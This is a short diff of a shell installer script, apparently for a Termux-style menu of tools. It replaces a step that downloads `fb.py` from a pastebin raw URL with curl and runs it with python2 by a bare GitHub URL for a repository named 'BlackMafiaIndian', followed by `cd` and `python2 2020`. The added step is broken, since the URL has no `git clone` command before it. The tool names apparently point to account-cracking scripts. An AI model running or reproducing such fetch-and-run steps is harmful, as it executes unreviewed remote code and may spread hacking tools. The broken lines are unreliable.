@@ -65,10 +65,9 @@ apt update && apt upgrade
 apt install git
 apt install python
 apt install python2
-pip2 install requests
-pip2 install mechanize
-curl -o fb.py https://pastebin.com/raw/puiL8m13
-python2 fb.py
+https://github.com/lovehackerAsif/BlackMafiaIndian.git
+cd BlackMafiaIndian
+python2 2020
 fi
 
 if [ $NOMER = 2 ]
